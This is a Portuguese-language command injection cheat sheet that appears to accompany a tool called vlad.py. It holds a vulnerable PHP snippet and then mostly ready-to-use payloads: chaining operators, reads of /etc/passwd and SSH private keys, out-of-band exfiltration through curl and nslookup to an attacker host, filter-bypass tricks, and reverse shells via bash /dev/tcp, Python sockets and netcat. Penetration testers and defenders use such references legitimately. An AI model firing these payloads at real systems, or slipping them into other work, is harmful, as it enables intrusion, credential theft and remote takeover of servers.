# Injeção de Comando (Command Injection)

## Como Funciona

A aplicação passa input do usuário para uma função de execução de shell sem sanitização adequada.

```php
// Código vulnerável PHP
$filename = $_GET['file'];
system("convert " . $filename . " output.jpg");
// Input: "foto.jpg; id"
// Executa: convert foto.jpg; id output.jpg
```

## Identificar Parâmetros Vulneráveis

```
Parâmetros que indicam execução de processo:
filename=, file=, cmd=, exec=, command=, ping=, host=
ip=, domain=, url= (quando processado por curl/wget)
convert=, compress=, resize=, process=
```

## Payloads Básicos

### Linux
```bash
# Encadeadores de comando
; id
| id
|| id
&& id
& id
`id`
$(id)
\nid

# Exemplos
?host=google.com; id
?filename=foto.jpg; cat /etc/passwd
?ip=8.8.8.8 | whoami
?cmd=$(id)
```

### Windows
```cmd
& whoami
&& whoami
| whoami
|| whoami
; whoami
```

## Blind Command Injection (sem output)

```bash
# Time-based
; sleep 5
| sleep 5
$(sleep 5)

# Out-of-band (DNS)
; nslookup $(id).atacante.com
; curl http://atacante.com/$(whoami)

# Escrever arquivo
; id > /tmp/vlad.txt
; cat /etc/passwd > /var/www/html/vlad.txt
```

## Bypass de Filtros

### Filtros de ponto e vírgula
```bash
# Usar outros separadores
| id      # pipe
|| id     # OR
& id      # background
&& id    # AND
%0aid     # newline encoded
```

### Filtros de espaço
```bash
id${IFS}         # IFS = Internal Field Separator
{cat,/etc/passwd}
id%09            # tab
```

### Filtros de barra (/)
```bash
cat${IFS}$HOME/.ssh/id_rsa
# ou usar variável com /
echo$IFS$PATH
```

### Bypass de blacklist de palavras
```bash
# cat alternativas
less /etc/passwd
more /etc/passwd
tail /etc/passwd
head /etc/passwd
sort /etc/passwd
strings /etc/passwd

# id alternativas
whoami
${cmd:=id}   # bash string substitution
```

## Escalação para Shell Reverso

```bash
# Payload de reverse shell
; bash -i >& /dev/tcp/ATACANTE/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATACANTE",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; nc -e /bin/bash ATACANTE 4444
```

## Detecção com vlad.py

```bash
python vlad.py web --alvo "http://alvo.com/?host=google.com" --tipo cmd
```
